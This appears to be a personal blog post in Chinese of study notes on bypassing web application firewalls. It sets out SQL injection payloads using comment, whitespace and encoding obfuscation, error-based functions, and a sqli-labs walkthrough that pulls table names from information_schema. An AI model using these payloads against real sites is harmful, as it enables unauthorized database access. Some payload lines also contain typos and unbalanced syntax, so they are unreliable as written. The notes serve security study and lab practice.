---
layout:       post
title:        "WAF绕过原理分析笔记"
subtitle:     "null"
date:         2020-10-01 14:55:43
author:       "NeptLiang"
header-img:   "img/home-bg.jpg"
header-mask:  0.3
catalog:      true
multilingual: true
tags:
    - Sec
    - WebSec
    - Bypass
---


# 0x00 前言

Null

---


# 0x01 白盒绕过

## 1. 分析代码

## 2. 绕过限制

1. **大小写变形**：`Or`，`OR`，`oR`，适用于正则没有`/i`
2. **等价替换**：`and`->`&&`, `or`->`||`
3. **双写**：`or`->`oorr`

---


# 0x02 黑盒绕过

参考[seceditor@MottoIN《WAF攻防研究之四个层次Bypass WAF》（mottoin.com/detail/359.html）](http://www.mottoin.com/detail/359.html)

## 一、架构层绕过WAF

1. 寻找**源站**（原始IP地址）->针对云WAF
2. 利用**同网段主机**进行渗透->绕过WAF防护区域
3. 利用**边界漏洞**（如利用SSRF）->绕过WAF防护区域

## 二、资源限制角度绕过WAF

POST**大BODY**（WAF可能会为了性能选择性忽略大数据包）

## 三、协议层面绕过WAF检测

### 1. 协议未覆盖

* 请求方式变换：GET->POST
* `Content-Type: application/x-www-form-urlencoded`
    -> `multipart/form-data`

### 2. 参数污染

检测：`?id=1&id=2`，WAF可能只检测第一个不检测第二个，中间件可能用第二个覆盖第一个

## 四、规则层面的绕过（绕过WAF规则）

### 1. SQL注释符绕过
1. 
    ```sql
    union/**/select
    ```
2. 
    ```sql
    union/*aaaa%0xbbs*/select
    ```
3. 
    ```sql
    union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select  /*（中间插入超长注释）*/
    ```
4. 内联注释：
    ```sql
    /*!xxx*/
    ```

### 2. 空白符绕过

1. MySQL**空白符**：`%09`, `%0A`, `%0B`, `%0D`, `%20`, `%0C`, `%A0`, `/*xxx*/`

2. 正则的**空白符**：`%09`, `%0A`, `%0B`, `%0D`, `%20`
* 例1：
    ```sql
    union%250Cselect
    ```
    （%25即“%”，“%250C”即"%0C")
* 例2：
    ```sql
    union%25A0select
    ```

3. **函数分割**符号  
    1. ```sql
        concat%2520(
        ```  
    2. ```sql
        concat/**/(
        ```  
    3. ```sql
        concat%250C(
        ```  
    4. ```sql
        concat%25a0(
        ```
4. **浮点数**词法解析（WAF可能对int/字符型+union select进行匹配，则用浮点型+union select）
    1. ```sql
        where id=8E0union select
        ```
    2. ```sql
        where id=8.0union select
        ```
    3. ```sql
        where id=\Nunion select
        ```
5. 利用**error-based**进行SQL注入（Error-based SQL注入函数非常容易被忽略）
    1. ```sql
        extractvalue(1,concat(0x5c,md5(3)));
        ```
    2. ```sql
        updatexml(1,concat(0x5d,md5(3),1);
        ```
    3. ```sql
        GeometryCollection((select*from(select*from(select@@version)f)x))
        ```
    4. ```sql
        ploygon((select*from(select name_const(version(),1))x))
        ```
    5. ```sql
        linestring()
        ```
    6. ```sql
        multpoint()
        ```
    7. ```sql
        multilineString()
        ```
    8. ```sql
        multipolygon()
        ```
6. MySQL特殊语法
    ```sql
    select{x table_name}from{x information_schema.tables};
    ```

---


# Fuzz绕过WAF

## 例1：注释符绕过

先测试最基本的：
```sql
union/**/select
```
再测试中间引入特殊字：
```sql
union/*aaaa%0xbbs*/select
```
最后测试注释长度：
```sql
union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select
```
模式：
```sql
union/*something*/select
```

## 例2：sqli-labs题解

1. **检测**：参数加单引号报错
2. **Fuzz**: 把空格（`%20`）替换为`/**/`，然后用脚本或bp在注释中插随机特殊字符进行Fuzz，如数字`1`、字母`a`、`!`、`@`、`#`、`$`、`%`、`'`等，通过响应长度、payload是否符合语法、响应是否报错判断发现`/*%!%2f*/`可绕过该WAF
3. 把参数中的空格（`%20`）全部**替换**为`/*%!%2f*/`进行下一步测试
4. `order by`判断**字段数**为3个
5. `union select 1, 2, 3`，发现`2`和`3`出现在页面上，故这两个位置可回显结果
6. `union select 1, user(), 3`，发现又被拦截，可知可能是`user()`被匹配到，故改成`user/*%!%2f*/()`，查询成功
7. 
    ```sql
    union select 1, (select table_name from information_schema.tables where table_schema=database() limit 0, 1), 3-- 
    ```

---


*//End of Article*

**参考文献**：

* [seceditor@MottoIN《WAF攻防研究之四个层次Bypass WAF》（mottoin.com/detail/359.html）](http://www.mottoin.com/detail/359.html)

![公众号二维码](https://neptliang.github.io/img/Article/WeChatBlog.png)